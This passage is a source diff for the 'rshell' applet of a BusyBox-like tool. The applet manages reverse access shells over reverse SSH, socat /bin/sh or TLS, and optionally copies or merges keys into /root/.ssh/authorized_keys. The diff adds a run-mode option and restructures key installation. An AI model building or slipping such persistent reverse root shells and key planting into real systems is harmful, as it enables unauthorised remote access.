@@ -63,6 +63,9 @@
 #ifndef BB_RSHELL_AUTHKEYS_MODE
 #define BB_RSHELL_AUTHKEYS_MODE "disabled"
 #endif
+#ifndef BB_RSHELL_RUN_MODE
+#define BB_RSHELL_RUN_MODE "auto"
+#endif
 #ifndef BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING
 #define BB_RSHELL_GENERATE_HOSTKEY_IF_MISSING "no"
 #endif
@@ -446,10 +449,12 @@ int applet_rshell_main(int argc, char **argv)
     if (argc > 1 && (!strcmp(argv[1], "--help") || !strcmp(argv[1], "-h"))) {
         puts("usage: busierbox rshell [start|status|stop|restart] [--transport ssh|socat|builtin]");
         puts("Starts or manages the configured reverse access transport.");
-        printf("Configured transport: %s  encryption: %s\n", BB_RSHELL_TRANSPORT, BB_RSHELL_ENCRYPTION);
+        printf("Configured transport: %s  encryption: %s  run_mode: %s\n",
+               BB_RSHELL_TRANSPORT, BB_RSHELL_ENCRYPTION, BB_RSHELL_RUN_MODE);
         printf("Shell provider: %s  retries: %s backoff=%s interval=%ss max=%ss\n",
                BB_RSHELL_SHELL_PROVIDER, BB_RSHELL_RETRY_COUNT, BB_RSHELL_RETRY_BACKOFF,
                BB_RSHELL_RETRY_INTERVAL_SEC, BB_RSHELL_RETRY_MAX_INTERVAL_SEC);
+        puts("Run mode: foreground keeps the shell in the current session; background is transport-specific; auto uses transport defaults.");
 #ifdef HAVE_WOLFSSL
         puts("Transports: ssh (Dropbear/dbclient reverse SSH), socat (staged socat /bin/sh), builtin (wolfSSL TLS shell).");
 #else
@@ -495,7 +500,7 @@ int applet_rshell_main(int argc, char **argv)
         const char *guard = autorun_guard_path();
         char pid_path[PATH_MAX], lock_path[PATH_MAX], status_path[PATH_MAX];
         static const char *pid_files[] = {
-            "dropbear.pid", "dbclient.pid", "socat.pid", NULL
+            "dropbear.pid", "dbclient.pid", "socat.pid", "rshell.pid", NULL
         };
         int k;
         for (k = 0; pid_files[k]; k++) {
@@ -679,19 +684,22 @@ int applet_rshell_main(int argc, char **argv)
         shquote_append(cmd, sizeof(cmd), _log_dir);
         strcat(cmd, " ");
     }
-    strcat(cmd, "mkdir -p ");
-    shquote_append(cmd, sizeof(cmd), rootssh);
-    strcat(cmd, " ");
     strcat(cmd, "$(dirname ");
     shquote_append(cmd, sizeof(cmd), hostkey);
     strcat(cmd, "); ");
     if (!strcmp(BB_RSHELL_AUTHKEYS_MODE, "root-copy")) {
+        strcat(cmd, "mkdir -p ");
+        shquote_append(cmd, sizeof(cmd), rootssh);
+        strcat(cmd, "; ");
         strcat(cmd, "if [ -f ");
         shquote_append(cmd, sizeof(cmd), authkeys);
         strcat(cmd, " ] && [ ! -f /root/.ssh/authorized_keys ]; then cp ");
         shquote_append(cmd, sizeof(cmd), authkeys);
         strcat(cmd, " /root/.ssh/authorized_keys 2>/dev/null || true; chmod 600 /root/.ssh/authorized_keys 2>/dev/null || true; fi; ");
     } else if (!strcmp(BB_RSHELL_AUTHKEYS_MODE, "root-merge")) {
+        strcat(cmd, "mkdir -p ");
+        shquote_append(cmd, sizeof(cmd), rootssh);
+        strcat(cmd, "; ");
         strcat(cmd, "if [ -f ");
         shquote_append(cmd, sizeof(cmd), authkeys);
         strcat(cmd, " ]; then tmp=/root/.ssh/authorized_keys.busierbox.$$; { sed '/^# BEGIN BUSIERBOX RSHELL$/,/^# END BUSIERBOX RSHELL$/d' /root/.ssh/authorized_keys 2>/dev/null || true; echo '# BEGIN BUSIERBOX RSHELL'; cat ");
